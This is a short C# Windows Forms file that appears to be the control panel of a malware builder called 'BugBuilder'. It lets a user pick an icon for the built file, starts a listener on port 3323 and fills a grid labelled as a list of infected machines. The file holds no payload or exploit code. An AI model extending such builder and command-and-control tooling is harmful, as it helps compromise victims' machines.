using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

using dllCoreBB;
using dllCoreBB.Server;
namespace BugBuilder_V0._0._1
{
    public partial class frmnMain : Form
    {
        public frmnMain()
        {
            InitializeComponent();
        }

        private void btnSelectIcon_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Filter = "Icons (*.ico)|*.ico";
            ofd.ShowDialog();

            if (ofd.FileName != "")
            {
                Image image = Image.FromFile(ofd.FileName);
                picBoxIcons.Image = image;
            }
        }

        private void btnBuild_Click(object sender, EventArgs e)
        {
                // Al instanciar el objeto, inicia la construccion
            Builder builder = new Builder();
        }

        private Server server;
        private List<ModelInfo> information = new List<ModelInfo>();
        private void btnStart_Click(object sender, EventArgs e)
        {
            // TODO : Encontrar la forma de convertir strings a IPAddress 
            server = new Server(System.Net.IPAddress.Any, 3323, this);

            lblStatusServer.Text = $"{System.Net.IPAddress.Any} : 3323";
            btnStart.Text = "STOP";
        }

        private void simpleButton1_Click(object sender, EventArgs e)
        {
            information.Add(server.modelInfo);
            gridControlInfectedList.DataSource = information;

            gridViewInfectedList.BeginUpdate();
            gridViewInfectedList.RefreshData();
            gridViewInfectedList.EndUpdate();
        }
    }
}
